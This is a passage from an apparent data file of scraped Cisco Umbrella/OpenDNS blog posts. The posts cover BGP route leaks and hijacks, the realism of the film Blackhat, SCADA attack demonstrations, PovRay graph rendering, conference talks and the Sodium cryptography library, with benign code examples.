say, “Hey, I’m GoodShoes, Inc.! And I’m over here!” Routers then use that information to find the best route to that company. This process is important because there are announcements that are only supposed to stay between two ASNs, not intended for further external use. When one of those ASNs propagates the announcement for the prefixes to the world incorrectly, it is called a “leak.” Leaks happen fairly regularly, and are typically due to configuration a mistake. As a result, traffic is redirected through a different network, which can cause issues like performance problems and security related concerns. BGP hijacks are a similar problem. With a BGP leak, an AS inserts itself in the middle of a path, but in a hijack an AS simply claims it owns the prefixes and should receive all traffic for it. BGP Leaks: Simple, Yet Costly Tier 1 provider Level3 recently became an unfortunate case study on the drastic effects of a mistaken BGP leak . It started when a Malaysian ISP incorrectly announced a large amount of routes –BGPmon estimates about 179,000 of them. Image: BGPMon.net Level3 then incorrectly accepted those routes as good, and re-routed  a massive flood of traffic to the ISP in Malaysia, by propagating the new routes to all its customers. It was a flood Telekom Malaysia did not intend, and was not equipped to handle, which then began dropping packets on a large scale. This event is essentially a mistaken “man-in-the-middle.” As a result, a number of major Internet services like Snapchat, Skype, and Google ended up having services degraded for about three hours. Three hours might not seem like much time, but in Internet time where millions of transactions take place every second, it can be extremely costly. And, according to Toonk, there’s a number of different ways these can occur and aside from some basic filtering, there’s not much to prevent them from happening. “There’s a whole philosophical debate as to who owns more responsibility in incidents like these,” he said. “Given how large Level3 is, and its pivotal role on the Internet, it has the greater responsibility in fixing issues like this because it’s what the company does. But obviously if the Malaysian telecom [company] had not made the error in the first place, it never would have happened.” BGP Hijacks: Simple, Yet Profitable One famous example of an entity conducting a BGP hijack on purpose was the Turkish hijack of Google DNS, OpenDNS, and Level3 in the spring of 2014 . At the time, a corruption scandal was brewing, and to circumvent blocks placed on Twitter and YouTube by large ISPs in Turkey, civilians began using free DNS services. In a ploy to stop the dissenters from spreading their message, Turk Telekom began hijacking DNS traffic using BGP announcements. Malicious hijacking can cause some damaging results. Toonk commented that if a hijack is successful, “the rate of impact can be severe.” But not all are politically motivated. Some are monetarily motivated, like the case of a large-scale hijack affecting at least 19 ISPs conducted by an attacker looking to steal Bitcoins. Going back to the concept of time during these sorts of attacks–or even in mistaken leaks like the one involving Malaysia Telekom–every second is damaging. The hacker who perpetrated the Bitcoin theft averaged around 30 seconds during each traffic hijack. Even so, after at least 22 attacks, it was enough time for him to steal around $9,000 a day, and an estimated $83,000 total. Routing Better: Time for a BGP Change Hijacks and leaks occur because the BGP framework–the system that runs the entire Internet–currently operates on a system of trust, and wasn’t designed with security built into it. There is currently no easy way to verify information from a provider. “In BGP I just have to trust whatever other providers are telling me, is true,” Toonk said. “But there’s no way to verify for sure. On the web, for instance, we have HTTPs. With a certain degree of trust, you can tell if the site you’re on is legitimate. With BGP, if you say you can reach Google, I just have to trust that is true.” And currently, Toonk said, there’s no easy way for the owner of an IP network to even prevent leaks and hijacks from occurring. ISPs and users of BGP can only monitor for incorrect routing events. This reality was confirmed by Job Snijders, an IP developer for NTT America, a major Tier 1  ISP. According to Snijders, there were a number of measures Level3 could have taken before and following the major route leak on June 12. He referenced an open letter to Level3 that suggested a number of measures the provider could have taken to prevent the leak from happening in the first place. One was maximum prefix limits–a way of setting a maximum number of new prefixes a peer can announce. Snijders said it’s up to providers and routers to change their behavior to prevent new announcements and routing changes from being accepted in bulk automatically. Some of the responsibility to prevent leaks also falls on manufacturers. Routers are by default often set to advertise every route they can possibly reach. “It would be a great win if manufacturers would provide network operators with a configuration knob that changes this default behavior ,” he said. “Leaks occur when filters don’t properly prevent this from happening.” A public key infrastructure called RPKI (resource public key infrastructure) could also help validate ASNs and IPs, but similar to DNSSEC, it’s running into difficulties with adoption, as not everyone in the industry is convinced it is the best fix. However, not all preventative measures need to be highly technical. Toonk says monitoring like the type that BGPMon provides can be a huge help in limiting attack or leak time and troubleshooting efforts. Proper filtering on the ISP side can also prevent a lot of issues. Or, as Snijders added, sometimes it might be as simple as picking up the phone. “When you see a route leak incident happen, get on the phone,” he said. “It doesn’t matter whether you are a customer, supplier, or just a bystander. Literally keep calling until you get through to someone who can fix the issue.” In the end, the system of trust that is holding up the Internet can also be used for good. “Perseverance always wins,” Snijders said. “We’re in this together. We need to help each other.”", "date": "2015-06-25"},
{"website": "Cisco-Umbrella", "title": "Stuxnet Meets Fukushima—How Realistic Is The New Blackhat Film?", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/stuxnet-meets-fukushima-realistic-new-blackhat-film", "abstract": "According to Andrew Hay, senior security research lead at OpenDNS, the storyline for Michael Mann’s new film, titled Blackhat, about an international crime ring of evil hacker masterminds was easy to identify. In a post screening interview, Hay commented on Blackhat’s plot by saying, “Mann clearly drew inspiration from real-world events. It’s basically the Fukushima Daiichi nuclear disaster meets Stuxnet .” While the film may be 2015’s first box-office bomb earning just $4M in its first weekend, its release was highly anticipated by the characteristically skeptical hacker community including Hay and his OpenDNS research colleague, Vinny Lariza. Although early previews reported the movie’s technical details were surprisingly accurate, Hay and Lariza weren’t convinced by the pre-release buzz. What could be more entertaining for a couple of world-class security researchers than an opportunity to weigh-in on the legitimacy of a blockbuster cyber crime thriller starring the former Norse God of Thunder? Last Friday, the film’s opening day, Hay and Lariza set out on a mission to debunk Hollywood’s latest take on modern day hacking. Blackhat stars Chris Hemsworth (aka Thor) as a talented hacker turned cyber-criminal who evades his 14-year federal prison sentence by helping the FBI prevent world destruction at the hands of genius coders. The plot chronicles ex-con Thor as he reunites with Colonel Chen, his college roommate and an officer in the Chinese military who returned home and now heads up the country’s Cyber Defense Organization. While the world teeters on the brink of disaster as it faces hacker-induced stock market anomalies and a mysterious natural disaster caused by malware in a ‘connected’ cooling system, Thor manages to spark an awkward romance with Chen’s sister, furiously pound-type on abnormally resilient keyboards, write code at a superhuman pace, and (spoiler alert) eliminate evil-doing hackers with his impressive collection of screwdrivers. How did Blackhat stand up under the scrutiny of real-world security experts who live and breathe hacking on a daily basis? Overall, Blackhat clearly benefitted from knowledgeable security advisors but according to the OpenDNS researchers, there were some scenes where the film misrepresented the realities of coding, forensics, and security in general. Here are some of their most noteworthy observations: NSA Phishing and The Black Widow Supercomputer: A major plot twist in this cyber tale involved a NSA supercomputing service called Black Widow. Black Widow was supposedly a system that, according to Hay and Lariza, would have taken anywhere from hours to months to upload. Thor, however, uploaded the entire system with the ease and speed of an Amazon 1-click purchase. Additionally, in order to access the highly classified and protected Black Widow service, Thor first had to outsmart an NSA agent with an obvious phishing email. The malicious email was sent to the agent “from his boss” and instructed him to change his password. Oddly, before the agent changed his password, he clicked on an attached PDF file named “Policy on Changing Your Password.” After the agent had reviewed the policy, downloaded a keylogger, and changed his password, Thor successfully gained access to the system. From the Web GUI for top secret software to the agent’s remarkable lack of security smarts, Hay and Lariza gave this scenario a zero out of ten in the accuracy category. TOR Setup Just Isn’t That Hard: Another favorite scene involved Thor’s love interest explaining how the villain hacker was using DD-WRT firmware combined with TOR to anonymize his identity without an IP address. In reference to TOR, Thor exclaims, “someone must have set it up for him!” Hay and Lariza  found this conclusion interesting given Thor, an expert hacker, was seemingly unaware that a very quick Google search would yield directions for this highly technical “setup”: Miraculous Hard Drive Selection: Hay and Lariza were also amused at Thor’s hard drive selection skills. Miraculously, when faced with selecting the right hard drive from a rack of over 50 boxes, he easily pulls the exact one that was storing the Jakarta-saving data needed to track down the villain hacker. Hay pointed out, “Random hard drive selection equals the keys to the kingdom” is not realistic, at all. Sloppy and Meaningless Code: There were several examples of sample code displayed throughout the film and while most of it appeared accurate, Hay recognized instances of ‘sloppy code’ – the kind computer science professors at Stanford would frown on. For example, “cp source destination” is correct but was written incorrectly in one scene as “cpsource destination” (not everyone is skilled enough to notice a missing space on the big screen). Other issues that put Blackhat’s technical accuracy in a less than legitimate light? In one scene, the malware code in question was displayed as hexadecimal on the left side of the screen with a mix of ridiculous characters and random English phrases on the right. According to Hay and Lariza – and probably most people who have used a hex editor before – this code would not, in fact, mean anything, let alone save the world from bad actors (pun intended). Overall, the team found Thor unconvincing in his role as a brilliant computer mastermind, but when measured against some other Hollywood attempts to dramatize hacking, Hay and Lariza gave the film a respectable 8 out of 10 for technical accuracy. Although relatively accurate, Blackhat still feeds Hollywood’s ongoing dramatization of hacking as a dark art practiced by modern day super villains. Hay and Lariza’s Favorite Hacker Movie Picks: Films about hacking are tough to do well, and according to Hay there hasn’t been a success in the genre since 1992. He recommends John Badham’s Wargames and Phil Alden Robinson’s Sneakers as films that successfully portray computer science on the big screen.", "date": "2015-01-20"},
{"website": "Cisco-Umbrella", "title": "New Survey Data Predicts the End of Hub-and-Spoke Networks for Branch Office Connectivity", "author": ["Stephen Lynch"], "link": "https://umbrella.cisco.com/blog/new-survey-data-branch-office-security", "abstract": "The traditional hub-and-spoke network topology is dying. That’s the conclusion drawn by Forrester Consulting in a new OpenDNS-commissioned Technology Adoption Profile, titled “ Securing Direct-To-Internet Branch Offices: Cloud-Based Security Offers More Flexibility And Control .” The report draws on new survey data that reveals the opinions of enterprise IT leaders about trends in branch office networking and security. As the paper states, the same trends that are eroding the network perimeter — most notably a mobile, cloud-based and distributed workforce — are now threatening the hub-and-spoke networks that many organizations use to connect their branch offices to the corporate data center. It also reveals that IT professionals are increasingly feeling pressure to scrap traditional, rigid centralized networks in favor of point solutions and “as-a-service” network connectivity. Similarly, Forrester’s survey dat a shows that the majority of branch offices rely on some form of direct connection for Internet access, with 40 percent of respondents saying their organizations entirely bypass the WAN at the branch office level. Only 36 percent of organizations backhaul traffic through a WAN connection exclusively before sending it out to the Internet. In many ways, this survey data echoes recent comments made by other leading analyst firms. Late last year, Gartner also stated that increased use of mobile devices and the cloud are leading to a trend in which more and more corporate traffic is bypassing the traditional WAN. Gartner also predicts that by 2018, 25 percent of corporate data traffic will flow directly from mobile devices to the cloud. Data from these and other analyst firms point toward increased business demands for agility, flexibility and worker empowerment trumping centralized IT authority over corporate Internet access. Forrester survey data also shows that this network change is impacting the way enterprises plan and implement security programs for branch offices.Survey respondents said that only 35 percent of companies are securing access to the Internet for their corporate headquarters (HQ), branch offices, and roaming employees as a single project. The rest are dividing security for these groups into separate initiatives. For more information, and to read the full study, check out the Forrester Technology Adoption Profile .", "date": "2015-03-24"},
{"website": "Cisco-Umbrella", "title": "Physical Damage: SCADA Attacks Easily Theorized, Hard to Execute", "author": ["Owen Lystrup"], "link": "https://umbrella.cisco.com/blog/physical-damage-scada-attacks-easily-theorized-hard-to-execute", "abstract": "A group of about 25 people crowded around IOActive ICS Principal Jason Larsen as he explained the processes needed to cause physical damage from an attack on an ICS or SCADA system–the control systems for electrical grids, manufacturing plants, water distribution systems, and so on. Just behind Larsen, two 55-gallon drums hooked to hoses and electrical lines monitoring pressure and temperature were arranged in a way similar to a crude whiskey distillery. Larsen was about to demonstrate his ability to digitally catalyze a change that would result in irreparable, real-world physical damage. It would be a remote hacking version of the simple physics experiment you can find on YouTube . Jason Larsen’s simple distillery at the ICS village in Defcon 23 demonstrated the physical effects of a hack. According to Larsen attacks perpetrated remotely in a live environment are never easy. They would take coordinated teams of people, advanced security expertise, and an intimate knowledge of the systems being attacked. In the aftermath of Stuxnet back in 2010, Liam O’Murchu at Symantec was credited with discovering the level of complexity and sophistication in the Stuxnet malware, which also translated to the actual physical attack. “From the SCADA side of things, which is a very specialized area, [the attackers] would have needed the actual physical hardware for testing, and [they would have had to] know how the specific factory floor works,” O’Murchu said in a ComputerWorld interview . “The specific factory floor” is important, because–as Larsen demonstrated in his session at Blackhat USA 2015 –each environment is unique, and navigating it from a remote location is often done “by feel.” “Hollywood has conditioned us to believe that once you’re in the [SCADA] controls, there’s a big red button that says ‘mash the big red button,’ and then things explode,” Larsen said. “In reality you have to analyze the process and build the big red button.” According to Larsen, the detailed knowledge of controls and processes required to pull off an attack that does physical damage is not easy to acquire, despite the copious descriptions of vulnerable SCADA and ICS infrastructure in the media. In a session at Defcon 23 Larsen and his presenting partner, Senior Security Consultant Marina Krotofil, explained that getting into a system and controlling that system are not nearly the same thing. The two described this misconception in their presentation description, “An attacker targeting a remote process is not immediately gifted with complete knowledge of the process and the means to manipulate it. Exploiting physical process is an exotic and hard to develop skill which have so far kept a high barrier to entry. Therefore real-world control system exploitation has remained in the hands of a few.” In fact, there are only two well-known industrial control attacks to date, the first being Stuxnet and the second an attack that occurred at a German steel mill in January 2015. The aftermath of a remotely initiated change in pressure. But in his controlled environment at the ICS Village, Larsen gave a small but impactful example of what’s at stake. A change in water temperature, resulting in a drastic change in pressure, ends up in an imploded 55-gallon drum. The demonstration leaves a small crowd gathered around the presentation stage gasping at the blowback of air pressure. Though they may be extremely difficult, Larsen had provided a live demonstration of what security researchers and SCADA experts have been saying is possible.", "date": "2015-08-12"},
{"website": "Cisco-Umbrella", "title": "Realistic Network Rendering with PovRay", "author": ["Thibault Reuille"], "link": "https://umbrella.cisco.com/blog/realistic-network-rendering-povray-leveraging-raytracers-fun-profit", "abstract": "Leveraging Raytracers for Fun and Profit. We’ve exposed a couple of methods to explore graphs in 3 dimensions in earlier blog posts. We were interested in realtime rendering in order to navigate inside our security data interactively. We’ve provided videos and online demos of our 3D engine but also details about the force-directed clustering algorithms. These technical details progressively give an overview of the visualization framework we are building here at OpenDNS. Today, we will explain a fun way to take advantage of legendary raytracers to produce realistic pictures of our data. We will also share some useful pieces of code and scripts to enable the reader to do the same on his own. A quick word on raytracers and PovRay In the 3D graphics world, there are several types of image rendering. The 2 main techniques are called Rastering and Raytracing. We could go for hours about all the details but it is important to understand the key differences : Rasterization works by drawing a very large number of triangles on the screen which are then shaded through a GPU pipeline simulating various light models. The resulting image is computed by projecting all the triangles on the screen. The process is extremely fast and is widely used in applications utilizing realtime graphics, requiring a very low latency. (Games, Simulators, Interactive interfaces, etc.) Raytracing works differently. It generates an image by tracing the path of light through pixels in an image plane. The light rays traverse the scene according to optics laws (Reflection, Refraction, Diffraction, Absorption, etc.). The process aims to give a high level of realism and comes with a great computational cost. Raytracing is widely used in 3D movies and a single image can often take several hours to be generated. PovRay (“Persistence of Vision Raytracer”) belongs to the second category. The interesting thing about PovRay is that it can be scripted and scenes can be described using a simple language. We’re going to take advantage of this to generate our 3D scene from the graph datasets! First step : Create a PovRay template The first thing we need is a PovRay template. We need to define a standard scene and a way to draw nodes and edges. Very simple indeed, we’ll start by defining some constants, placing a couple of lights and a camera. #include \"colors.inc\"\nglobal_settings {\n\tassumed_gamma 1.0\n\tambient_light Gray\n}\nbackground {\n\tcolor Black\n}\nlight_source { <10000, 0, 0> color White }\nlight_source { <0, 10000, 0> color White }\nlight_source { <0, 0, 100000> color White }\ncamera {\n  sky <0, 1, 0>\n  right <4/3, 0, 0>\n  look_at <0, 0, 0>\n  location <5.0, 5.0, 5.0>\n} More documentation on lights and camera can be found here : http://www.povray.org/documentation/view/3.7.0/308/ http://www.povray.org/documentation/view/3.7.0/246/ And we’ll just use spheres for the nodes and cylinders for the edges. As an example, we’ll just define two spheres and one cylinder connecting them. // First node\nsphere {\n    <-2.0, 0.0, 0.0>, 1.0 // Position : (-2, 0, 0), Radius : 1.0\n    texture { pigment { color rgb<1.0, 0.0, 0.0> }} // Color : Red\n    finish {\n        ambient .2\n        diffuse .6\n        specular .75\n        roughness .001\n        reflection { 0.2 }\n    }\n}\n// Second node\nsphere {\n    <2.0, 0.0, 0.0>, 1.0 // Position : (2, 0, 0), Radius : 1.0\n    texture { pigment { color rgb<0.0, 0.0, 1.0> }} // Color : Blue\n    finish {\n        ambient .2\n        diffuse .6\n        specular .75\n        roughness .001\n        reflection { 0.2 }\n    }\n}\ncylinder {\n    <-2.0, 0.0, 0.0>, <2.0, 0.0, 0.0>, 0.5 // Radius : 0.5, from node 1 to 2\n    texture { pigment { color rgb<0.5, 0.5, 0.5> }}\n    finish {\n        ambient .2\n        diffuse .6\n        specular .75\n        roughness .001\n        reflection { 0.5 }\n    }\n} In the “finish” scope, we define the shading of the objects. Essentially it tells PovRay how the spheres/cylinders are going to react to light. In our case, we’ve defined a nice shiny material with some reflections. Now if you render this template with PovRay, you should get something like this : Second step : Convert a 3D graph to a PovRay scene Now that we have our template, the concept is very simple. We take our graph, create a sphere for each node and then for each edge, create a cylinder connecting the two nodes. And voilà! The pseudo-code to do it would look like this: sphere_radius = 1.0\ncylinder_radius = 0.5\nforeach node in graph.nodes do\n    generate_sphere(node.position, sphere_radius, node.color)\nforeach edge in graph.edges do\n    generate_cylinder(edge.src.position, edge.dst.position, cylinder_radius, edge.color) Of course, you can adapt it to map the color/radius to anything else (Node weight, Node degree, Edge type …). It’s up to you! It also means you will need to have the node position already pre-computed using any layout algorithm. You can implement your own or export it from any graph rendering software. Results Here is a small gallery of datasets obtained using the OpenDNS visualization tool and some some datasets built using our mighty Security Graph: Degree view of CanSecWest.com (White nodes have the most connections, Black nodes have the least connections) Co-occurrence graph around a Cryptolocker domain (Red : Malicious, Green : Benign, White : Unknown) Same as above from a different view point and a different color code (Brown : Malicious, Blue : Benign, Yellow : Unknown) Breadth First traversal from Reddit.com, nodes are colored according to their types (Blue : Domain, Yellow : IP, Pink : Whois info) Tips: Depending on the graph you’re dealing with, you will probably need to adjust the camera position to choose a good view point. When rendering scenes with raytracers, the image calculation can take a while especially with very large graphs. It is often a good idea to compute the image with a small resolution and a low level of details. This way you will be able to quickly see if your parameters are correct before spending precious minutes/hours rendering a erroneous image. Once you are sure the basic parameters are correct, you can launch the real rendering process with full quality. To achieve the nice “blobby” effect you can see on some of the images, you will need to define a blob scope and a couple of iso-values / thresholds. More documentation here : http://www.povray.org/documentation/view/3.7.0/275/ Conclusion We’ve presented a fun way to take advantage of PovRay to generate realistic pictures of our datasets created with the Security Graph and its API. We hope you found this article interesting and that it hopefully triggered some new ideas. We’ve only used a very tiny part of PovRay’s features but you can definitely go much deeper in refining your template to achieve mind-blowing results. Feel free to send and share your best work!", "date": "2014-05-12"},
{"website": "Cisco-Umbrella", "title": "Las Vegas Presentation Recap", "author": ["OpenDNS Security Research"], "link": "https://umbrella.cisco.com/blog/las-vegas-presentation-recap", "abstract": "OpenDNS had a very busy schedule in Las Vegas last week. From BSides Las Vegas to Black Hat to DEFCON 22 , OpenDNS presented 5 talks involving 6 people over 6 days. To summarize what we experienced in the land of ringing bells, ridiculous buffets, and climate controlled environments, Vinny LaRiza, Adrienne Merrick-Tagore, Andrew Hay, and Thibault Reuille have some observations from the various conferences. BSides Las Vegas – Vinny LaRiza I have been to a few Security BSides events in the past, so in that regard this wasn’t my first rodeo. I felt like I pretty much knew what to expect. This time was slightly different, however. For one, I was no longer be in my backyard. This time I was in in sparkly Las Vegas, Nevada, the “Miracle in the Desert”, where the “Sky’s the Limit.” I also presented a thirty-minute talk about phishing sites, which was something that I’d never done before. Was I nervous? Sure. Public speaking is high on the list of people’s biggest fears – and I am one of those people. But not for nothing, I have always appreciated the BSides events for their welcoming vibe and positive demeanor. It seemed like a fitting place to cut my teeth. Needless to say, the talk – How To Punch a Phisher in the Face! (video) – went over quite well with the audience, who were chiming in towards the end with their own anecdotes as well as including their own solutions to how they prevent themselves from phishing attacks. Speaking at BsidesLV was a great experience and I would encourage anyone involved in or with technology to participate. BSides Las Vegas – Adrienne Merrick-Tagore I’m a relative n00b to security conferences. In the last year, I’ve been to Black Hat, RSA, and Bsides San Francisco.  This was my first time presenting in front of a security audience. My talk centered on my experience interacting with the OpenDNS Security Graph API, from the perspective as a fairly non-technical marketer. I opened by taking a photo of the audience, and then dove into my journey learning how to interact with the API. I wanted to accomplish two things. At a technical level, I wanted to see what OpenDNS’s customers’ experience would be when they interact with our API. I wanted to put myself in their shoes, to learn how to use our product and its API. At a personal level, I wanted to dust off my Python knowledge and apply it to something relevant in my real life, and to inspire others to take the plunge into hack away at something new. This was a nerve-wracking, rewarding, fun experience! I faced my fear of public speaking by presenting in front of about 30 people. I learned something new that was personally fulfilling and that will also make me better at my job. In the process, I met some really cool people, some of whom are now inspired to learn Python or another programming language. And now I’m hooked – I want to do it again! The recording of my  talk can be found here: Can I Code Against an API to Learn a Product ? (video) Black Hat 2014 – Andrew Hay I have attended Black Hat for a number of years but 2014 marks the first time I’ve been accepted to present. Thibault Reuille and I presented our talk entitled Unveiling The Open Source Visualization Engine For Busy Hackers , which served as a launch pad for OpenGraphiti – our free and open source data visualization engine. How’d we do? Based on the applause, the laughing at our jokes, and the audience engagement during the talk (not to mention the continuous flood of questions at our booth on the show floor before and after the presentation) we believe that the session was a complete success! We were told the room held ~603 people and, based on a very rough count, I estimate that between 550 and 575 people attended – that’s >90% capacity for those of you counting along at home. We also had the opportunity to brief several people including a podcast-style interview with DarkReading and several reporters from Forbes, Wired, and other well respected technology news outlets. Thibault and I also provided a very informal (if not ad hoc) Q&A session at the booth adjacent to the OpenDNS booth. At the table, we were able to sit down with existing OpenDNS customers, data scientists, security analysts, and other interested parties who had specific questions about OpenGraphiti , Investigate , and Umbrella. Thibault and I weren’t the sole OpenDNS representatives accepted to speak at Black Hat, however. Dhia Mahjoub and Andree Toonk joined Thibault at Black Hat to present Catching Malware En Masse: DNS and IP Style . (Note: Thibault will talk about this more in his DEFCON wrap up section as the talk was also presented there.) DEFCON 22 – Thibault Reuille What a great pleasure and honor to finally step foot in the legendary DEFCON ! It was a first for me and also for some of my partners in crime. Several OpenDNS folks attended DEFCON including (from right to left) Anthony Kasza, Dhia Majhoub, Andree Toonk, and myself. I had a feeling that DEFCON wouldn’t disappoint, and it certainly didn’t! We were presenting our research in front of a very responsive crowd. Indeed, we had interesting content as Dhia was presenting discoveries and detection models to catch malware IP & DNS style, Andree offered his networking expertise and vision on monitoring the large ASN network and its BGP routing tables, and finally I did my best to illustrate our talk with interactive 3D visuals create with OpenGraphiti . Our talk was very well received and several times during the talk people stood up and started clapping. It definitely meant a lot to us. A couple of minutes into the talk, the DEFCON “Goons” played a joke on us. They interrupted our presentation to have us drink a shot of Whisky. In fact, we learned this is a tradition for the first time speakers at DEFCON. Good times. Other than that, it’s pretty hard to describe the DEFCON spirit other than saying that “it’s fairly unique”. The vendors were selling trendy security hardware as SomaFM played soft lounge music in the chill out room with beautiful animated visuals. The various villages presented interesting talks over a wide variety of topics (Cryptography, Wireless, Social Engineering …) while the impressive CTF contest took place with participants from all over the world. Last but not least, the Wall of Sheep! One of the rooms had a large screen showing the results of a password sniffer running on the open DEFCON network. If you were on that board, I’m sorry for your account. Leaving Las Vegas The entire OpenDNS team had a blast in Las Vegas. Sharing knowledge, answering questions, and engaging in deeply technical conversations are what make security conferences great. We will definitely be back at Black Hat in 2015 and I suspect we will have far more research to present at the Black Hat, BSides Las Vegas, and DEFCON conferences as the team continues to shine a light on the darker parts of the Internet. Until next time!", "date": "2014-08-14"},
{"website": "Cisco-Umbrella", "title": "Introducing Sodium, a new cryptographic library", "author": ["OpenDNS Security Research"], "link": "https://umbrella.cisco.com/blog/announcing-sodium-a-new-cryptographic-library", "abstract": "The Trouble with crypto libraries Cryptography is hard. Hard to design, hard to implement, hard to use, and hard to get right. Modern and well-studied ciphers rely on intractable problems and are believed to have a very high security margin, even in a post-quantum world. But the cipher is rarely the weakest link in an application using cryptography. No matter how secure a function is, its security can be totally destroyed by a tiny weakness in its implementation or by using it incorrectly. And an application using cryptography has to do way more than picking a decently secure set of primitives. The well-known OpenSSL library provides a wide range of cryptographic primitives and related helpers. Unfortunately, developers are likely to be confused by its overly-complex API. And sadly, the W3C crypto API is currently taking the very same path. Is encryption all it takes to provide integrity? Is the key length the best indicator of how secure a cipher is? How should random numbers be generated? What are these “modes”? Is opting for the fastest one, like ECB, the best way to go? Why not just use SHA1(secret | message) instead of a HMAC? Frequently, developers make arbitrary choices in response to the above questions, leading to security disasters. Worse, this happens most frequently when the intent was to achieve a very common operation. In order to address this, Daniel J. Bernstein released NaCl . NaCl is a new and very opiniated cryptographic library. From a user perspective, it exposes a very simple, high-level API, with a tiny set of functions for each operation. Under the hood, it uses high-speed, highly-secure primitives and constructions, implemented with extreme care to avoid side-channel attacks. NaCl has no low-security options and makes very conservative choices of cryptographic primitives, while remaining exceptionally fast. NaCl is an awesome toolkit for developers willing to add cryptography to their applications, that drastically reduces the risk of building insecure constructions. In fact, last year OpenDNS released DNSCrypt , an open-source tool I built for securing DNS communications, that leverages the NaCl crypto library. But NaCl didn’t get much adoption, for several important reasons: While each primitive comes with one or more portable implementations, NaCl itself is not portable. In particular, it can only be compiled on some Unix flavors. NaCl ships with constructions that were just prototypes, and that shouldn’t be used any more. The compiled code is only guaranteed to work on the machine it was compiled on. NaCl is not a shared library, making it difficult to use in other programming languages, and it hasn’t been designed to be installed system-wide. Packaging NaCl for different operating systems is tough due to its specific build system and compile-time requirements. Well, NaCL just got a lot better. Today, I’m announcing Sodium , a portable, cross-compilable, installable, packageable, API-compatible version of NaCl. Sodium uses the same implementations of crypto primitives as NaCl, but is known to work on all the platforms supported by DNSCrypt, including Bitrig, OpenBSD, Dragonfly BSD, NetBSD, FreeBSD, SmartOS, OSX, Linux, Windows, iOS and Android. Sodium installs a shared library and a standard set of headers, supports parallel compilation and testing, and uses a portable implementation of each primitive. It also includes convenience functions for generating secure random numbers, and adds additional primitives and helpers to address common needs. What Sodium does for you Authenticated public-key and authenticated shared-key encryption This operation ensures that a message remains secret and can’t be modified by an attacker. Public-key and shared-key signatures This operations allows the recipient of a message to verify that it actually comes from the expected sender, and that it hasn’t been modified. Hashing This operation compresses a message to a short, fixed-size output from which the original message can’t be computed. Keyed hashes for short messages A lot of applications and programming language implementations have been recently found to be vulnerable to denial-of-service attacks when a hash function with weak security guarantees, like Murmurhash 3 , was used to construct a hash table. In order to address this, Sodium provides the “shorthash” function, currently implemented using SipHash-2-4 . This very fast hash function outputs short, but unpredictable (without knowing the secret key) values suitable for picking a list in a hash table for a given key. Secure pseudo-random numbers generation This generates pseudo-random numbers suitable for cryptographic purposes. Implementations can be dynamically chosen at run-time. On Windows platforms, it uses the Cryptographic Services Provider by default. Sodium also provides a secure, chroot()-resistant drop-in replacement for the arc4random() function family, including the ability to generate random numbers within a given interval with a nearly random distribution. Why I built Sodium One of the best things about working at OpenDNS is that the company is committed to the larger goal of making the Internet safer, and being transparent in our efforts. We build products that secure businesses against malware, but we also take time to build tools that can serve the greater needs of the security community. For example, earlier this year the Umbrella Security Labs announced the Umbrella Security Graph, a tool that helps researchers predict unknown threats. Before that, OpenDNS released DNSCrypt, an open-source tool I built for securing DNS communications, that leverages the NaCl crypto library. The company has been vocal on privacy, too. As an engineer and security advocate, I see cryptography as a critical building block to achieving privacy and security. I wanted to give back to the security community in a way that could make real impact. I hope you’ll find Sodium to be a valuable resource in your cryptography toolbox, and in your efforts to secure communications. Installing Sodium People quickly adopted Sodium and built packages for different operating systems. OSX, using Homebrew: brew install libsodium Arch Linux package NetBSD, Dragonfly BSD (pkgsrc) and FreeBSD: install the security/libsodium package Debian: follow this bug report CocoaPods (iOS/OSX) Using Chef: libsodium cookbook FPM-cookery recipe , to generate .deb and .rpm packages For the bleeding-edge source code, clone the Sodium Git repository . Using Sodium While the Sodium library provides an API for the C language, bindings for other languages, currently Ruby and Python, are also available: Ruby: RbNaCl Python: PyNaCl Python example Installing the PyNaCl package $ git clone git@github.com:dstufft/pynacl.git\n$ cd pynacl\n$ python setup.py install Public-key signature import nacl\nkey_seed = nacl.random(32)\nprivate_key = nacl.signing.SigningKey(key_seed) # this preprends a 512-bit signature to the message\nsigned_message = private_key.sign('message') public_key = private_key.verify_key\n# signing_key has to remain secret\n# public_key should be sent to the recipient Verifying the signature of a signed message try:\n  message = public_key.verify(signed_message)\n  print(message)\nexcept BadSignatureError:\n  sys.stderr.write(\"Incorrect signaturen\") Ruby example Installing the RbNaCl gem $ git clone git://github.com/cryptosphere/rbnacl.git\n$ cd rbnacl\n$ gem build rbnacl.gemspec\n$ gem install rbnacl-*.gem Public-key authenticated encryption # Alice's key pair\nalice_private_key = Crypto::PrivateKey.generate\nalice_public_key = alice_private_key.public_key # Bob's key pair\nbob_private_key = Crypto::PrivateKey.generate\nbob_public_key = bob_private_key.public_key # Alice's \"box\" to encrypt/decrypt messages for/from Bob\nalice_box = Crypto::Box.new(bob_public_key, alice_private_key) # Bob's \"box\" to encrypt/decrypt messages for/from Alice\nbob_box = Crypto::Box.new(alice_public_key, bob_private_key) # Alice encrypts and signs a message for Bob.\n# This operation needs a nonce for each message: a unique 192-bit value that\n# should never ever be reused with the same key.\nnonce = Crypto::Random.random_bytes(24)\nciphertext = alice_box.box(nonce, 'message') # Bob verifies and decrypts Alice's message\nbegin\n  message = bob_box.open(nonce, ciphertext)\n  puts(message)\nrescue Crypto::CryptoError\n  STDERR.puts(\"Ciphertext failed verification\")\nend Privacy and security are important concerns, and cryptography is a critical building block to achieve these.", "date": "2013-03-06"},
{"website": "Cisco-Umbrella", "title": "Announcing Simple Cloud-to-Cloud Log Management with OpenDNS and Amazon S3", "author": ["Stephen Lynch"], "link": "https://umbrella.cisco.com/blog/log-management-with-opendns-and-amazon-s3", "abstract": "The 2014 Verizon Data Breach Investigations Report calls a company’s DNS connection “the single best source” for detecting data exfiltration and command-and-control traffic from compromised hosts. It also recommends integrating DNS logs with other threat intelligence sources for stronger correlation and attribution. But despite this, according to the report, most organizations don’t integrate DNS logs into their SIEM, leaving them blind to an entire spectrum of Internet traffic. This blindspot includes traffic from external domains (i.e., most malware command-and-control traffic) and Internet requests using IRC, SSH, and other non-standard ports and protocols. A common refrain from infosec analysts, customers, and the broader professional community is you can’t have security without first having visibility. OpenDNS – a leading provider of network security and DNS services – offers a response today by announcing Log Management with Amazon S3, a new way to centrally collect, manage, and store DNS logs in the cloud. Log Management provides a simple cloud-to-cloud storage solution for all of a company’s DNS logs that customers can deploy in less than half an hour. It also takes advantage of pre-built integrations between leading SIEM solutions – such as Splunk – and Amazon S3 to import DNS logs in minutes. To do their work properly, investigators need clear insight into past events. Log Management provides a way to keep DNS log archives long past the time a 